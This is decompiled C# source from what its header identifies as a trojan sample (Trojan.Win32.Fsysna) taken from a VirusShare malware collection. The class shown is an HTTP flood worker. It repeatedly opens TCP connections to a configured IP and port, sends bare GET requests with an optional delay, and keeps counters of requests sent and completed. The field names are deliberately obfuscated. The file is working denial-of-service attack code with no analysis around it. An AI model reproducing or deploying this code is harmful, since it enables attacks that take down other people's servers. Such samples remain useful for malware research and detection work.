// Decompiled with JetBrains decompiler
// Type: cliente.config2
// Assembly: cliente, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 93A55DE0-10E1-46A2-BE93-6BF6C932E5D1
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkys-27e1831bfa3ff50e5bd76882076cf96f1f0837b7433f502a8f2893e086e3ed2e.exe

using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace cliente
{
  internal class config2
  {
    public bool sakertuwsh;
    public string swswsws;
    public int iopuytrg;
    public string sed;
    public int juhuhu;
    public int bvnghnhvg;
    public config2.ReqState asawdwad = config2.ReqState.Ready;
    public int efkoef_okkffo = 0;
    public int qw = 0;
    public int _a = 0;
    public bool tararra;
    private long ass;
    private Random rnd = new Random();

    public config2(string sIP, int iPort, string sSubsite, bool bResp, int iDelay, int iTimeout)
    {
      this.swswsws = sIP;
      this.iopuytrg = iPort;
      this.sed = sSubsite;
      this.tararra = bResp;
      this.juhuhu = iDelay;
      this.bvnghnhvg = iTimeout;
    }

    public void Start()
    {
      this.sakertuwsh = true;
      this.ass = config2.Tick();
      System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
      timer.Tick += new EventHandler(this.tTimepoll_Tick);
      timer.Start();
      BackgroundWorker backgroundWorker = new BackgroundWorker();
      backgroundWorker.DoWork += new DoWorkEventHandler(this.bw_DoWork);
      backgroundWorker.RunWorkerAsync();
    }

    private void tTimepoll_Tick(object sender, EventArgs e)
    {
      if (config2.Tick() <= this.ass + (long) this.bvnghnhvg)
        return;
      this.sakertuwsh = false;
      ++this._a;
      this.asawdwad = config2.ReqState.Failed;
    }

    private void bw_DoWork(object sender, DoWorkEventArgs e)
    {
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes("GET " + this.sed + " HTTP/1.0\r\n\r\n\r\n");
        IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(this.swswsws), this.iopuytrg);
        while (this.sakertuwsh)
        {
          this.asawdwad = config2.ReqState.Ready;
          this.ass = config2.Tick();
          byte[] buffer = new byte[64];
          Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
          this.asawdwad = config2.ReqState.Connecting;
          socket.Connect((EndPoint) remoteEP);
          socket.Blocking = this.tararra;
          this.asawdwad = config2.ReqState.Requesting;
          socket.Send(bytes, SocketFlags.None);
          this.asawdwad = config2.ReqState.Downloading;
          ++this.qw;
          if (this.tararra)
            socket.Receive(buffer, 64, SocketFlags.None);
          this.asawdwad = config2.ReqState.Completed;
          ++this.efkoef_okkffo;
          if (this.juhuhu > 0)
            Thread.Sleep(this.juhuhu);
        }
      }
      catch
      {
      }
      this.sakertuwsh = false;
    }

    private static long Tick() => DateTime.Now.Ticks / 10000L;

    public enum ReqState
    {
      Ready,
      Connecting,
      Requesting,
      Downloading,
      Completed,
      Failed,
    }
  }
}
